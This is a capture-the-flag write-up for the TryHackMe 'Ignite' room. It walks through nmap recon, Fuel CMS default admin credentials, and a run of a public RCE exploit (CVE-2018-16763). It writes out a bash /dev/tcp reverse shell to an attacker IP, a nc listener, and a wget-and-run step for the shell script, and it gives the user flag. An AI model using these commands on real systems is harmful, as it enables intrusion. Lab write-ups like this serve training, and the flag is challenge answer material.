# Ignite

<div align="left">

<figure><img src=".gitbook/assets/676cb3273c613c9ba00688162efc0979.png" alt="" width="128"><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>

</div>

🔗 [Ignite](https://tryhackme.com/room/ignite)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.166.221`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

```bash
su
echo "10.10.166.221 ignite.thm" >> /etc/hosts

mkdir thm/ignite.thm  
cd thm/ignite.thm

# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 ignite.thm
PING ignite.thm (10.10.166.221) 56(84) bytes of data.
64 bytes from ignite.thm (10.10.166.221): icmp_seq=1 ttl=63 time=61.5 ms
64 bytes from ignite.thm (10.10.166.221): icmp_seq=2 ttl=63 time=62.8 ms
64 bytes from ignite.thm (10.10.166.221): icmp_seq=3 ttl=63 time=63.7 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.

#### 2.1 - Find open ports on the machine

```bash
nmap --open -n -Pn -vvv -T4 ignite.thm
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-02 11:12 EDT
Initiating SYN Stealth Scan at 11:12
Scanning ignite.thm (10.10.166.221) [1000 ports]
Discovered open port 80/tcp on 10.10.166.221
Completed SYN Stealth Scan at 11:12, 0.99s elapsed (1000 total ports)
Nmap scan report for ignite.thm (10.10.166.221)
Host is up, received user-set (0.068s latency).
Scanned at 2023-07-02 11:12:22 EDT for 1s
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
           Raw packets sent: 1000 (44.000KB) | Rcvd: 1000 (40.004KB)
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

```bash
map -p80 -sCV -T4 ignite.thm -oN port_scan
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/fuel/
```

It looks like there are only one open port on the machine: HTTP.

#### Task 3 - What is the user flag? 

<figure><img src=".gitbook/assets/Schermata del 2023-07-02 17-19-30.png" alt=""><figcaption><p>http://ignite.thm:80</p></figcaption></figure>

We can search exploit with searchsploit:

```bash
searchsploit fuel cms 1.4 
------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                  |  Path
------------------------------------------------------------------------------------------------ ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                      | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                      | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                      | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                     | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                            | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                | php/webapps/48778.txt
------------------------------------------------------------------------------------------------ ---------------------------------
```

Very good, there're many exploits for this CMS.

Exploring page we found a good info:

<figure><img src=".gitbook/assets/Schermata del 2023-07-02 17-23-40.png" alt=""><figcaption></figcaption></figure>

To access the FUEL admin, go to:\
[http://ignite.thm/fuel](http://ignite.thm/fuel)\
User name: **admin**\
Password: **admin** (you can and should change this password and admin user information after logging in).

<div align="left">

<figure><img src=".gitbook/assets/Schermata del 2023-07-02 17-25-17 (1).png" alt=""><figcaption></figcaption></figure>

</div>

<figure><img src=".gitbook/assets/Schermata del 2023-07-02 17-26-30.png" alt=""><figcaption></figcaption></figure>

Now, we can try to exploit using a RCE exploit, first we download script from searchsploit db:

```bash
searchsploit -m 50477.py                             
  Exploit: Fuel CMS 1.4.1 - Remote Code Execution (3)
      URL: https://www.exploit-db.com/exploits/50477
     Path: /usr/share/exploitdb/exploits/php/webapps/50477.py
    Codes: CVE-2018-16763
 Verified: False
File Type: Python script, ASCII text executable
cp: overwrite '/home/kali/50477.py'? 
Copied to: /home/kali/50477.py
```

After this, we can launch exploit:

```bash
python 50477.py -u http://ignite.thm
```

<div align="left">

<figure><img src=".gitbook/assets/Schermata del 2023-07-02 19-39-11.png" alt=""><figcaption></figcaption></figure>

</div>

We need to do a reverse shell, we start to:

Retrieve our ip address:

```bash
ip -br -c a
```

and create a shell file with nano:

```bash
nano shell.sh
```

Insert this line for a bash reverse shell:

```bash
/bin/bash -i >& /dev/tcp/10.0.2.15/3333 0>&1
```

Setup a Python web server and a `nc` listener on 2 different tabs:

1st tab:

```bash
python -m http.server
```

2nd tab:

```bash
nc -nvlp 3333
```

Now, we can return in the exploited Fuel CMS tab, and do this commands:

```bash
wget http://10.0.2.15:8000/shell.sh -O shell.sh
bash shell.sh
```

Reverse shell received in the `nc` terminal:

```bash
/usr/bin/script -qc /bin/bash /dev/null
cd /home/www-data
ls
cat flag.txt
```

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

`6470e394cbf6dab6a91682cc8585059b`

</details>

#### Task 4 - What is the root flag? 

<details>

<summary>🚩 Flag 2 (root.txt)</summary>



</details>
